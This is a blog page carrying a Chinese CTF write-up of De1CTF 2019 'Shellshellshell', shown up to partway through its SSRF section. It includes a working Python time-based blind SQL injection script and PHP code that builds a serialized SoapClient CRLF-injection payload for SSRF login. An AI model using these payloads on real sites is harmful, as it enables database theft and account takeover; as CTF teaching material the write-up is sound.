@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="De1CTF 2019的Shellshellshell。 扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ刷题-Web-shellshellshell">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="De1CTF 2019的Shellshellshell。 扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/preg_replace.png">
+<meta property="article:published_time" content="2019-09-17T11:03:00.000Z">
+<meta property="article:modified_time" content="2019-12-10T12:15:12.603Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BUUOJ">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="盲注">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="SoapClient">
+<meta property="article:tag" content="Slepp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/preg_replace.png">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ刷题-Web-shellshellshell | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#part-2.-soapclient-ssrf"><span class="nav-number">1.</span> <span class="nav-text">Part 2. SoapClient SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#part-3.-internat-exploit"><span class="nav-number">2.</span> <span class="nav-text">Part 3. Internat Exploit</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ刷题-Web-shellshellshell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-09-17 19:03:00" itemprop="dateCreated datePublished" datetime="2019-09-17T19:03:00+08:00">2019-09-17</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2019-12-10 20:15:12" itemprop="dateModified" datetime="2019-12-10T20:15:12+08:00">2019-12-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>De1CTF 2019的Shellshellshell。</p>
+<p>扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。 <a id="more"></a> # Part 1. SQL Injection</p>
+<p>看一下源码，发现在user.php里的publish()有个奇怪的insert:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood = addslashes(serialize(<span class="keyword">new</span> Mood((<span class="keyword">int</span>)$_POST[<span class="string">&#x27;mood&#x27;</span>],get_ip())));</span><br><span class="line">                $db = <span class="keyword">new</span> Db();</span><br><span class="line">                @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">&#x27;signature&#x27;</span>],$mood));</span><br><span class="line">                <span class="keyword">if</span>($ret)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>直接带入<span class="math inline">\(\_POST[&#39;signature&#39;]，那么来看一下\)</span>db-&gt;insert的实现。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span>(<span class="params">$columns</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_array($columns))</span><br><span class="line">        $column = <span class="string">&#x27; `&#x27;</span>.implode(<span class="string">&#x27;`,`&#x27;</span>,$columns).<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        $column = <span class="string">&#x27; `&#x27;</span>.$columns.<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $column;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">$columns,$table,$values</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">    $value = <span class="string">&#x27;(&#x27;</span>.preg_replace(<span class="string">&#x27;/`([^`,]+)`/&#x27;</span>,<span class="string">&#x27;\&#x27;$&#123;1&#125;\&#x27;&#x27;</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    $nid =</span><br><span class="line">    $sql = <span class="string">&#x27;insert into &#x27;</span>.$table.<span class="string">&#x27;(&#x27;</span>.$column.<span class="string">&#x27;) values &#x27;</span>.$value;</span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><span class="math inline">\(column通过get_column()获得，将传入的\)</span>columns组成用反引号包裹的字符串，如：`<span class="math inline">\(columns[0],\`\)</span>columns[1]`，重点是<span class="math inline">\(value，preg_replace的正则意思是如果原\)</span>value不存在`或,，就将反引号包裹的$value转成单引号包裹。效果如下图：</p>
+<img src="/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/preg_replace.png" class="" title="insert的preg_replace">
+<p>这样就会对SQL注入带来麻烦，如<span class="math inline">\(values=array(&quot;admin&quot;,&quot;test&#39; or 1=1,3#&quot;);，过get_column()处理后变成&quot;\`admin\`,\`test&#39; or 1=1,3#\`&quot;，再过preg_replace后变成&quot;&#39;admin&#39;,\`test&#39; or 1=1,3#\`&quot;。在逗号之前没出现另一个反引号，造成test前的反引号没有配对，无法转换，保留下来，造成实际执行的SQL语句不合法。那么我们如果在其中插入反引号会怎样？\)</span>values=array("admin","`test' or 1=1,3#");过get_column()处理变成"`admin`,``test' or 1=1,3#`"，过preg_replace变成"'admin',``test' or 1=1,3#`"，还是不对。那么换个位置怎样？$values=array("admin","test`' or 1=1,3#");过get_column()变成"`admin`,`test`' or 1=1,3#`"，再过preg_replace变成"'admin','test'' or 1=1,3#`"，好了我们逃逸出来一个单引号，那就够了。</p>
+<p>上文提到的user.php中的publish()允许我们用POST提交signature，条件满足，写脚本吧。这是个insert类型注入，用sleep盲注。注入的数据大概为324`,3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#，带入SQL就变成了 <code>insert into ctf_user_signature( `userid`,`username`,`signature`,`mood` ) values ( '1','test','324',3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#`,'O:4:\"Mood\":3:&#123;s:4:\"mood\";i:1;s:2:\"ip\";s:11:\"192.168.1.4\";s:4:\"date\";i:1568730153;&#125;' )</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=2hl10o0f976664asa88vkcoeq6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://62614c8b-c370-493c-bb6f-1087ddf417bc.node1.buuoj.cn/index.php?action=publish&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> (string.ascii_lowercase+string.digits):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;signature&quot;</span>: <span class="string">&quot;324`,3),((if(ascii(substring((select password from ctf_users where username=0x61646d696e),&#123;0&#125;,1))=&#123;1&#125;,sleep(15),1)),1,2,3)#&quot;</span>.format(a,</span><br><span class="line">                                                                                                                     ord(b)),</span><br><span class="line">            <span class="string">&quot;mood&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            x = requests.post(url=url, headers=header, data=data, timeout=<span class="number">13</span>)</span><br><span class="line">            print(data)</span><br><span class="line">            x.close()</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            result += b</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>我们已知用户名为admin，直接从ctf_users表读密码并且password一定是MD5可以限定字符集，由于网络问题可能出现错误，多试几次。得到MD5：c991707fdf339958eded91331fb11ba0，解得jaivypassword。</p>
+<h1 id="part-2.-soapclient-ssrf">Part 2. SoapClient SSRF</h1>
+<p>但是我们直接登录后发现不允许我们登录。提示：You can only login at the usual address。回去翻源码。用的get_ip()返回$_SERVER['REMOTE_ADDR']，这个没法绕过。我们需要能本地访问的方法，要么绕过REMOTE_ADDR，要么找到一处SSRF，登录后返回Cookie，我们再用Cookie登录。</p>
+<p>然后注意到publish()还有一处奇怪的地方：$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));。可以序列化，当前代码里没有任何有关SSRF的类，那么就要考虑PHP本地类了。这里参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2148">N1CTF 2018 Easy&amp;&amp;Hard PHP</a>，使用SoapClient。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=8qpm643062ib88mnqerme74kl4&#x27;</span> <span class="comment">#我们先访问login页面分配一个Cookie，同时爆破得到验证码</span></span><br><span class="line">);</span><br><span class="line">$target = <span class="string">&#x27;http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;username=admin&amp;password=jaivypassword&amp;code=267234&#x27;</span>;<span class="comment">#刚才爆破得到的验证码</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers) . <span class="string">&#x27;^^Content-Length:&#x27;</span> . (<span class="keyword">string</span>)strlen($post_string) . <span class="string">&#x27;^^^^&#x27;</span> . $post_string,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="comment">//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求</span></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>, $aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;%26&#x27;</span>, $aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 得到结果O:10:"SoapClient":4:{s:3:"uri";s:4:"aaab";s:8:"location";s:81:"http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login";s:11:"_user_agent";s:171:"wupco%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aCookie: PHPSESSID=8qpm643062ib88mnqerme74kl4%0d%0aContent-Length:49%0d%0a%0d%0ausername=admin%26password=jaivypassword%26code=267234";s:13:"_soap_version";i:1;}
+</p>
+<p>下面的问题是我们的$_POST['Mood']被转成int处理了，没法注入进去。然后我们发现user.php中showmess()会将数据库中的Mood读出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function showmess()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            //id,sig,mood,ip,country,subtime</span><br><span class="line">            $db = new Db();</span><br><span class="line"><span class="meta">            @$ret = $db-&gt;select(array(&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;,&#x27;id&#x27;),&#x27;ctf_user_signature&#x27;,&quot;userid = $this-&gt;userid order by id desc&quot;);</span></span><br><span class="line">            <span class="keyword">if</span>($ret) &#123;</span><br><span class="line">                $data = array();</span><br><span class="line">                while ($row = $ret-&gt;fetch_row()) &#123;</span><br><span class="line">                    $sig = $row[<span class="number">1</span>];</span><br><span class="line">                    $mood = unserialize($row[<span class="number">2</span>]);</span><br><span class="line">                    $country = $mood-&gt;getcountry();</span><br><span class="line">                    $ip = $mood-&gt;ip;</span><br><span class="line">                    $subtime = $mood-&gt;getsubtime();</span><br><span class="line">                    $allmess = array(&#x27;id&#x27;=&gt;$row[3],&#x27;sig&#x27; =&gt; $sig, &#x27;mood&#x27; =&gt; $mood, &#x27;ip&#x27; =&gt; $ip, &#x27;country&#x27; =&gt; $country, &#x27;subtime&#x27; =&gt; $subtime);</span><br><span class="line">                    array_push($data, $allmess);</span><br><span class="line">                &#125;</span><br><span class="line">                $data = json_encode(array(&#x27;code&#x27;=&gt;0,&#x27;data&#x27;=&gt;$data));</span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>我们就不必考虑绕过int转换了，在刚才的SQL注入那里我们可以插入一个Mood，所以我们的Payload为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;<span class="comment"># 一定得是127.0.0.1，SSRF要从本地访问</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=kvvs649604t498pgc5sp936oa5&#x27;</span><span class="comment"># 重新分配一个未登陆的Cookie，提前爆破好验证码</span></span><br><span class="line">);</span><br><span class="line">$post_string = <span class="string">&#x27;username=admin&amp;password=jaivypassword&amp;code=497567&#x27;</span>; <span class="comment">#code为刚才爆破好的</span></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers) . <span class="string">&#x27;^^Content-Length: &#x27;</span> . (<span class="keyword">string</span>)strlen($post_string) . <span class="string">&#x27;^^^^&#x27;</span> . $post_string,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, $aaa);<span class="comment">#&amp;字符不能改变</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
